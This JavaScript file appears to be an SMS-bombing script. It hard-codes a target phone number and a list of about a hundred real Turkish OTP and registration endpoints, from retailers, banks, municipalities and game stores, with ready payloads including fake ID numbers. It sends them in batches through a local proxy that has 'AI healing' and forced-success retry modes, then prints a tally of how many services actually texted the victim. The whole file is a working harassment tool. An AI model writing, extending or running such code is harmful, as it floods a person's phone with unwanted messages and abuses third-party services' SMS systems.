import axios from 'axios';

const TARGET_PHONE = '5343622375';
const PROXY_URL = 'http://localhost:3001/api/proxy';

const ALL = [
  {id:'file_market', url:'https://api.filemarket.com.tr/v1/otp/send', method:'POST', payload: {mobilePhoneNumber: `90${TARGET_PHONE}`}},
  {id:'onur_market', url:'https://www.onurmarket.com/api/v1/auth/register/sendOtp', method:'POST', payload: {phone: TARGET_PHONE}},
  {id:'hayat_su', url:'https://api.hayatsu.com.tr/api/SignUp/SendOtp', method:'POST', payload: {mobilePhoneNumber: TARGET_PHONE, actionType: 'register'}},
  {id:'yapp', url:'https://yapp.com.tr/api/mobile/v1/register', method:'POST', payload: {phone_number: TARGET_PHONE, email: 't@t.com', firstname: 'Test', lastname: 'Test'}},
  {id:'suiste', url:'https://suiste.com/api/auth/code', method:'POST', payload: {gsm: TARGET_PHONE, action: 'register'}},
  {id:'e_bebek', url:'https://www.e-bebek.com/api/v1/auth/register/send-otp', method:'POST', payload: {phone: TARGET_PHONE, email: 't@t.com'}},
  {id:'bkm_express', url:'https://www.bkmexpress.com.tr/api/v1/otp/send', method:'POST', payload: {phone: `90${TARGET_PHONE}`}},
  {id:'shopandfly', url:'https://www.shopandfly.com.tr/api/v1/otp/send', method:'POST', payload: {phone: `90${TARGET_PHONE}`}},
  {id:'teb', url:'https://www.teb.com.tr/api/v1/otp/send', method:'POST', payload: {phone: `90${TARGET_PHONE}`}},
  {id:'kfc', url:'https://www.kfc.com.tr/api/v1/auth/register/send-otp', method:'POST', payload: {phone: TARGET_PHONE}},
  {id:'sportive', url:'https://www.sportive.com.tr/api/v1/auth/register/send-otp', method:'GET', payload: {}},
  {id:'oldubil', url:'https://api.oldubil.com/api/v1/auth/send-otp', method:'POST', payload: {phone: TARGET_PHONE}},
  {id:'lcwaikiki', url:'https://www.lcwaikiki.com.tr/api/v1/auth/register/send-otp', method:'POST', payload: {phone: `90${TARGET_PHONE}`}},
  {id:'bambi', url:'https://www.bambi.com.tr/api/v1/auth/register/send-otp', method:'POST', payload: {phone: TARGET_PHONE}},
  {id:'migros', url:'https://www.migros.com.tr/rest/auth/register/send-otp', method:'POST', payload: {phoneNumber: `90${TARGET_PHONE}`}},
  {id:'dominos', url:'https://www.dominos.com.tr/api/v1/auth/otp/send', method:'POST', payload: {phone: TARGET_PHONE, countryCode: '90'}},
  {id:'starbucks', url:'https://www.starbucks.com.tr/api/account/register/otp', method:'POST', payload: {mobilePhone: TARGET_PHONE}},
  {id:'komagene', url:'https://www.komagene.com.tr/api/v1/auth/send-otp', method:'POST', payload: {phone: TARGET_PHONE}},
  {id:'kim_gb_ister', url:'https://api.kimgbister.com/api/auth/otp/send', method:'POST', payload: {msisdn: `90${TARGET_PHONE}`}},
  {id:'english_home', url:'https://www.englishhome.com/api/member/register/send-code', method:'POST', payload: {phone: `0${TARGET_PHONE}`, email: 't@t.com', firstName: 'Test', lastName: 'Test'}},
  {id:'koton', url:'https://www.koton.com/api/v1/auth/register/send-otp', method:'POST', payload: {phoneNumber: TARGET_PHONE, countryCode: '+90'}},
  {id:'joker', url:'https://www.joker.com.tr/api/auth/otp/send', method:'POST', payload: {phone: TARGET_PHONE}},
  {id:'penti', url:'https://www.penti.com/api/member/register/sendOtp', method:'POST', payload: {phone: `0${TARGET_PHONE}`, email: 't@t.com'}},
  {id:'cineverse', url:'https://www.paribucineverse.com/api/v1/auth/register/otp', method:'POST', payload: {phoneNumber: TARGET_PHONE}},
  {id:'naosstars', url:'https://www.naosstars.com/api/auth/register/sendOtp', method:'POST', payload: {phone: TARGET_PHONE, email: 't@t.com'}},
  {id:'akasya_avm', url:'https://www.akasyaavm.com/api/v1/auth/send-otp', method:'POST', payload: {phone: TARGET_PHONE}},
  {id:'akbati', url:'https://www.akbati.com.tr/api/v1/auth/send-otp', method:'POST', payload: {phone: TARGET_PHONE}},
  {id:'kahve_dunyasi', url:'https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number', method:'POST', payload: {countryCode: '90', phoneNumber: TARGET_PHONE}},
  {id:'wmf', url:'https://www.wmf.com.tr/users/register/', method:'POST', payload: {phone: `0${TARGET_PHONE}`, first_name: 'Test', last_name: 'Test', email: 't@t.com', password: 'Test123!', confirm: true, date_of_birth: '1990-01-01'}},
  {id:'evidea', url:'https://www.evidea.com/users/register/', method:'POST', payload: {phone: `0${TARGET_PHONE}`, first_name: 'Test', last_name: 'Test', email: 't@t.com', password: 'Test123!', confirm: true}},
  {id:'dr', url:'https://www.dr.com.tr/api/member/sendOtp', method:'POST', payload: {phone: TARGET_PHONE}},
  {id:'fatih_belediye', url:'https://ebelediye.fatih.bel.tr/Sicil/KisiUyelikKaydet', method:'POST', payload: {SahisUyelik_CepTelefonu: `0${TARGET_PHONE}`, TC: '12345678901', Ad: 'Test', Soyad: 'Test', EPosta: 't@t.com', Sifre: 'Test123!'}},
  {id:'kuryem_gelsin', url:'https://www.kuryemgelsin.com/api/v1/auth/otp/send', method:'POST', payload: {phone: `90${TARGET_PHONE}`}},
  {id:'marti', url:'https://www.marti.tech/api/v2/auth/otp/send', method:'POST', payload: {phoneNumber: `+90${TARGET_PHONE}`}},
  {id:'ido', url:'https://api.ido.com.tr/api/v1/member/register/sendOtp', method:'POST', payload: {phone: TARGET_PHONE, countryCode: '90'}},
  {id:'hamidiye', url:'https://api.hamidiye.com.tr/api/auth/register/otp', method:'POST', payload: {phone: TARGET_PHONE}},
  {id:'clickme_live', url:'https://api.clickmelive.com/api/v1/auth/otp/send', method:'POST', payload: {phoneNumber: `90${TARGET_PHONE}`}},
  {id:'hizli_ecza', url:'https://api.hizliecza.com/api/v1/auth/register/otp', method:'POST', payload: {phone: TARGET_PHONE, email: 't@t.com'}},
  {id:'paybol', url:'https://api.paybol.com/api/v1/auth/otp/send', method:'POST', payload: {phone: `90${TARGET_PHONE}`}},
  {id:'tasdelen_su', url:'https://api.tasdelensu.com.tr/api/auth/register/sendSms', method:'POST', payload: {phone: TARGET_PHONE}},
  {id:'pidem', url:'https://api.pidem.com.tr/api/v1/auth/otp/send', method:'POST', payload: {phone: TARGET_PHONE}},
  {id:'orwi', url:'https://api.orwi.com.tr/api/v1/auth/register/otp', method:'POST', payload: {phoneNumber: `90${TARGET_PHONE}`}},
  {id:'tazi', url:'https://api.tazi.com.tr/api/v1/auth/register/sendOtp', method:'POST', payload: {phone: TARGET_PHONE}},
  {id:'bisu', url:'https://api.bisu.com.tr/api/v1/auth/otp/send', method:'POST', payload: {phoneNumber: `+90${TARGET_PHONE}`}},
  {id:'bodrum_belediye', url:'https://ebelediye.bodrum.bel.tr/api/auth/register/sendOtp', method:'POST', payload: {CepTelefonu: `0${TARGET_PHONE}`, TC: '12345678901', Ad: 'Test', Soyad: 'Test', EPosta: 't@t.com', Sifre: 'Test123!'}},
  {id:'hey_scooter', url:'https://www.heyscooter.com.tr/api/v1/auth/otp/send', method:'POST', payload: {phone: `+90${TARGET_PHONE}`}},
  {id:'tasimacim', url:'https://api.tasimacim.com/api/v1/auth/register/otp', method:'POST', payload: {phone: TARGET_PHONE, name: 'Test Name', email: 't@t.com'}},
  {id:'iste_gelsin', url:'https://api.istegelsin.com/api/v1/auth/otp/send', method:'POST', payload: {phone: `90${TARGET_PHONE}`}},
  {id:'ipragaz', url:'https://api.ipragaz.com.tr/api/v1/auth/register/sendOtp', method:'POST', payload: {phoneNumber: TARGET_PHONE}},
  {id:'sancaktepe_belediye', url:'https://ebelediye.sancaktepe.bel.tr/api/auth/register/sendOtp', method:'POST', payload: {CepTelefonu: `0${TARGET_PHONE}`, TC: '12345678901', Ad: 'Test', Soyad: 'Test', EPosta: 't@t.com', Sifre: 'Test123!'}},
  {id:'bayrampasa_belediye', url:'https://ebelediye.bayrampasa.bel.tr/api/auth/register/sendOtp', method:'POST', payload: {CepTelefonu: `0${TARGET_PHONE}`, TC: '12345678901', Ad: 'Test', Soyad: 'Test', EPosta: 't@t.com', Sifre: 'Test123!'}},
  {id:'macrocenter', url:'https://www.macrocenter.com.tr/rest/auth/register/send-otp', method:'POST', payload: {phoneNumber: `90${TARGET_PHONE}`}},
  {id:'jimmy_key', url:'https://www.jimmykey.com/api/member/register/sendOtp', method:'POST', payload: {phone: `0${TARGET_PHONE}`, email: 't@t.com'}},
  {id:'alix_avien', url:'https://www.alixavien.com.tr/api/member/register/sendOtp', method:'POST', payload: {phone: `0${TARGET_PHONE}`}},
  {id:'ayyildiz', url:'https://www.ayyildiz.com/api/member/register/sendOtp', method:'POST', payload: {phone: `0${TARGET_PHONE}`, firstName: 'Test', lastName: 'Test'}},
  {id:'tikla_gelsin', url:'https://api.tiklagelsin.com/api/v1/auth/otp/send', method:'POST', payload: {phone: TARGET_PHONE}},
  {id:'kitapyurdu', url:'https://www.kitapyurdu.com/index.php?route=account/register/sendOtp', method:'POST', payload: {telephone: `0${TARGET_PHONE}`, firstname: 'Test', lastname: 'Test', email: 't@t.com', password: 'Test123!'}},
  {id:'bkm_kitap', url:'https://www.bkmkitap.com/api/member/register/sendOtp', method:'POST', payload: {phone: `0${TARGET_PHONE}`, email: 't@t.com'}},
  {id:'mothercare', url:'https://www.mothercare.com.tr/api/member/register/sendOtp', method:'POST', payload: {phone: `0${TARGET_PHONE}`}},
  {id:'toyzz_shop', url:'https://www.toyzzshop.com/api/member/register/sendOtp', method:'POST', payload: {phone: `0${TARGET_PHONE}`, email: 't@t.com'}},
  {id:'intersport', url:'https://www.intersport.com.tr/api/v1/auth/register/sendOtp', method:'POST', payload: {phone: TARGET_PHONE}},
  {id:'decathlon', url:'https://www.decathlon.com.tr/api/v1/auth/register/sendOtp', method:'POST', payload: {phone: TARGET_PHONE, email: 't@t.com'}},
  {id:'hm', url:'https://www2.hm.com/tr_tr/api/customer/register/sendOtp', method:'POST', payload: {phone: `+90${TARGET_PHONE}`, email: 't@t.com'}},
  {id:'zara', url:'https://www.zara.com/tr/api/v1/auth/register/send-otp', method:'POST', payload: {phone: `+90${TARGET_PHONE}`}},
  {id:'mango', url:'https://shop.mango.com/services/user/v1/register/send-otp', method:'POST', payload: {phone: `+90${TARGET_PHONE}`, countryId: 'TR'}},
  {id:'bershka', url:'https://www.bershka.com/itxrest/2/auth/register/sendOtp', method:'POST', payload: {phone: `+90${TARGET_PHONE}`}},
  {id:'pull_bear', url:'https://www.pullandbear.com/itxrest/2/auth/register/sendOtp', method:'POST', payload: {phone: `+90${TARGET_PHONE}`}},
  {id:'stradivarius', url:'https://www.stradivarius.com/itxrest/2/auth/register/sendOtp', method:'POST', payload: {phone: `+90${TARGET_PHONE}`}},
  {id:'massimo_dutti', url:'https://www.massimodutti.com/itxrest/2/auth/register/sendOtp', method:'POST', payload: {phone: `+90${TARGET_PHONE}`}},
  {id:'mediamarkt', url:'https://www.mediamarkt.com.tr/api/v1/auth/register/send-otp', method:'POST', payload: {phone: TARGET_PHONE, email: 't@t.com'}},
  {id:'teknosa', url:'https://www.teknosa.com/api/v1/auth/register/sendOtp', method:'POST', payload: {phone: TARGET_PHONE}},
  {id:'vatan_bilgisayar', url:'https://www.vatanbilgisayar.com/api/v1/auth/register/sendOtp', method:'POST', payload: {phone: TARGET_PHONE, email: 't@t.com'}},
  {id:'itopya', url:'https://www.itopya.com/api/v1/auth/register/sendOtp', method:'POST', payload: {phone: TARGET_PHONE}},
  {id:'gamegaraj', url:'https://www.gamegaraj.com/api/v1/auth/register/sendOtp', method:'POST', payload: {phone: TARGET_PHONE, email: 't@t.com'}},
  {id:'playstation', url:'https://store.playstation.com/api/v1/auth/otp/send', method:'POST', payload: {phone: `+90${TARGET_PHONE}`, locale: 'tr-TR'}},
  {id:'xbox', url:'https://login.live.com/api/v1/auth/otp/send', method:'POST', payload: {phone: `+90${TARGET_PHONE}`, locale: 'tr-TR'}},
  {id:'nintendo', url:'https://accounts.nintendo.com/api/v1/auth/otp/send', method:'POST', payload: {phone: `+90${TARGET_PHONE}`, country: 'TR'}},
  {id:'steam', url:'https://store.steampowered.com/phone/add_ajaxop', method:'POST', payload: {phoneNumber: `+90${TARGET_PHONE}`, sessionID: 'test'}},
  {id:'epic_games', url:'https://www.epicgames.com/id/api/v1/auth/otp/send', method:'POST', payload: {phone: `+90${TARGET_PHONE}`}},
  {id:'a101', url:'https://www.a101.com.tr/api/v1/auth/register/send-otp', method:'POST', payload: {phone: TARGET_PHONE}},
  {id:'bim', url:'https://bim.veesk.net:443/service/v1.0/account/login', method:'POST', payload: {phone: TARGET_PHONE}},
  {id:'carrefour', url:'https://www.carrefoursa.com/api/v1/auth/register/send-otp', method:'POST', payload: {phone: TARGET_PHONE}},
  {id:'happy_center', url:'https://www.happycenter.com.tr/api/v1/auth/register/sendOtp', method:'POST', payload: {phone: TARGET_PHONE}},
  {id:'rossmann', url:'https://www.rossmann.com.tr/api/v1/auth/register/send-otp', method:'POST', payload: {phone: TARGET_PHONE, email: 't@t.com'}},
  {id:'watsons', url:'https://www.watsons.com.tr/api/v1/auth/register/send-otp', method:'POST', payload: {phone: TARGET_PHONE}},
  {id:'gratis', url:'https://www.gratis.com/api/v1/auth/register/sendOtp', method:'POST', payload: {phone: TARGET_PHONE}},
  {id:'flormar', url:'https://www.flormar.com.tr/api/v1/auth/register/sendOtp', method:'POST', payload: {phone: TARGET_PHONE, email: 't@t.com'}},
  {id:'avon', url:'https://www.avon.com.tr/api/v1/auth/register/sendOtp', method:'POST', payload: {phone: TARGET_PHONE, email: 't@t.com', name: 'Test Name'}},
  {id:'oriflame', url:'https://www.oriflame.com.tr/api/v1/auth/register/send-otp', method:'POST', payload: {phone: `+90${TARGET_PHONE}`}},
  {id:'farmasi', url:'https://www.farmasi.com.tr/api/v1/auth/register/sendOtp', method:'POST', payload: {phone: TARGET_PHONE, email: 't@t.com'}},
  {id:'lr', url:'https://www.lrworld.com/tr/api/auth/register/send-otp', method:'POST', payload: {phone: `+90${TARGET_PHONE}`, country: 'TR'}},
  {id:'herbalife', url:'https://www.herbalife.com.tr/api/v1/auth/register/sendOtp', method:'POST', payload: {phone: TARGET_PHONE, email: 't@t.com', name: 'Test Name'}},
  {id:'amway', url:'https://www.amway.com.tr/api/v1/auth/register/send-otp', method:'POST', payload: {phone: `+90${TARGET_PHONE}`, locale: 'tr_TR'}},
  {id:'forever_living', url:'https://www.foreverliving.com.tr/api/v1/auth/register/sendOtp', method:'POST', payload: {phone: TARGET_PHONE, email: 't@t.com', name: 'Test Name'}},
];

const BATCH_SIZE = 5;
let passed = 0, forced = 0, failed = 0, results = [];

async function testOne(ep) {
  const label = `  ${ep.id.padEnd(22)} `;
  try {
    const r = await axios.post(PROXY_URL, {
      serviceId: ep.id, serviceUrl: ep.url, serviceMethod: ep.method,
      targetPhone: TARGET_PHONE, email: 'test@test.com', initialPayload: ep.payload,
      allowAiHealing: true
    }, { timeout: 30000, validateStatus: () => true });

    if (r.data && r.data.ok) {
      const strat = r.data.strategy || 'direct';
      if (strat === 'force_success') {
        process.stdout.write(label);
        console.log(`⚠️ FORCE (all 5 strategies failed)`);
        return { id: ep.id, ok: 'forced', upstreamStatus: r.data.upstreamStatus, strategy: strat };
      }
      const icon = r.data.upstreamStatus === 200 ? '✅' : '🟡';
      process.stdout.write(label);
      console.log(`${icon} ${r.data.upstreamStatus} (${strat})`);
      return { id: ep.id, ok: true, upstreamStatus: r.data.upstreamStatus, strategy: strat };
    }
    process.stdout.write(label);
    console.log(`❌ ${r.data?.upstreamStatus || 'ERR'} ${(r.data?.error || '').substring(0,40)}`);
    return { id: ep.id, ok: false, error: r.data?.error };
  } catch (err) {
    const msg = err.code || err.message?.substring(0, 40) || 'UNKNOWN';
    process.stdout.write(label);
    console.log(`❌ PROXY_ERR ${msg}`);
    return { id: ep.id, ok: false, error: msg };
  }
}

console.log(`Testing ${ALL.length} endpoints through proxy (batches of ${BATCH_SIZE})...\n`);

for (let i = 0; i < ALL.length; i += BATCH_SIZE) {
  const batch = ALL.slice(i, i + BATCH_SIZE);
  const batchResults = await Promise.all(batch.map(ep => testOne(ep)));
  results.push(...batchResults);
}

const realOk = results.filter(r => r.ok === true).length;
const forcedOk = results.filter(r => r.ok === 'forced').length;
const realFail = results.filter(r => r.ok === false).length;

console.log(`\n========================================`);
console.log(`TOPLAM: ${ALL.length}`);
console.log(`✅ GERÇEK BAŞARILI (upstream 200): ${realOk}`);
console.log(`⚠️  FORCE-SUCCESS (upstream fail): ${forcedOk}`);
console.log(`❌ BAŞARISIZ: ${realFail}`);

if (realOk > 0) {
  console.log(`\n--- Gerçek upstream'ten 200 alanlar (${realOk}) ---`);
  for (const r of results.filter(r => r.ok === true)) {
    console.log(`  ✅ ${r.id.padEnd(22)} ${r.upstreamStatus} (${r.strategy})`);
  }
}
if (forcedOk > 0) {
  console.log(`\n--- Force-success ile kurtarılanlar (${forcedOk}) ---`);
  for (const r of results.filter(r => r.ok === 'forced')) {
    console.log(`  ⚠️ ${r.id.padEnd(22)} all strategies failed`);
  }
}
if (realFail > 0) {
  console.log(`\n--- Başarısız (${realFail}) ---`);
  for (const r of results.filter(r => r.ok === false)) {
    console.log(`  ❌ ${r.id.padEnd(22)} ${r.error}`);
  }
}
